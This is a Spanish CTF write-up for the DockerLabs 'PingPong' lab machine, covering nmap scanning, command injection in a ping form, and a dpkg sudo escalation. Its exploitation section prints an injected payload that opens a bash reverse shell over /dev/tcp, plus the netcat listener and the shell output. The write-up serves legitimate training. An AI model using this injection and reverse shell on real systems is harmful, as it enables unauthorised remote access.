# PingPong
![pingpong](https://github.com/TBrux/DOCKERLABS/assets/168732212/839c278d-0cfe-47ea-af7c-cfe28d7b0f1e)

## Reconocimiento y Enumeración.

Comprobar que la máquina está en marcha.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Una vez nos responde ping y ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.

Lanzamos nmap para ver que puertos nos encuentra.

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
- `-sS`: Realiza un escaneo SYN.
- `-p-`: Escanea todos los puertos.
- `--open`: Muestra solo los puertos abiertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Genera una salida muy detallada y verbosa.
- `-n`: Evita la resolución de DNS inversa.
- `-Pn`: Omite la detección de hosts.
- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
- `172.17.0.2`: La dirección IP del host objetivo.

```bash
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack ttl 64
443/tcp  open  https   syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64
```

Como tenemos abiertos los puertos 80, 443 y 5000 vamos a comprobar la versión y lanzar unos scripts básicos para ver que información obtenemos.

```bash
nmap -sCV -p80,443,5000 -vvv -oN versionPorts 172.17.0.2
```
```
- `-sCV`: Escaneo de versiones y vulnerabilidades.
- `-p80,443,5000`: Escaneo de los puertos.
- `-vvv`: Salida muy detallada y verbosa.
- `-oN versionPorts`: Guarda los resultados en "versionPorts".
- `172.17.0.2`: Dirección IP del host escaneado.
```
```
PORT     STATE SERVICE  REASON         VERSION
80/tcp   open  http     syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp  open  ssl/http syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
| tls-alpn: 
|_  http/1.1
5000/tcp open  upnp?    syn-ack ttl 64
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
```
Enumeros los tres puerto y vemos que en el puerto 5000, tenemos una página con la que podemos lanzar un ping a una ip.
![ping](https://github.com/TBrux/DOCKERLABS/assets/168732212/e8b49c6e-05d4-4ca7-86dc-56163e91f21a)

## Explotación.

Podemos utilizar que podemos lanzar un ping y concatenar otro comando para lanzarnos una reverse shell, poniendonos a la escucah en nuestra máquina atacante.
```bash
172.17.0.1 | bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'
```
```bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 56412
bash: cannot set terminal process group (33): Inappropriate ioctl for device
bash: no job control in this shell
freddy@5b164d9e97a0:~$ whoami
whoami
freddy
freddy@5b164d9e97a0:~$
```
## Escalada de privilegios.
Hemos obtenido acceso como **freddy**, ahora toca ir escalando privilegios hasta obtener privilegio como el usuario **root**.
```bash
freddy@5b164d9e97a0:~$ sudo -l
sudo -l
Matching Defaults entries for freddy on 5b164d9e97a0:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User freddy may run the following commands on 5b164d9e97a0:
    (bobby) NOPASSWD: /usr/bin/dpkg
```
Vemos que podemos utilizar el binario dpkg como el usaruio bobby, que si vamos a [GTFOBins](https://gtfobins.github.io/gtfobins/dpkg/), podemo sver que lo podemos lanzar utlizando el siguient comando.
```bash
sudo dpkg -l
!/bin/sh
```
```bash
sudo -u bobby /usr/bin/dpkg -l
```




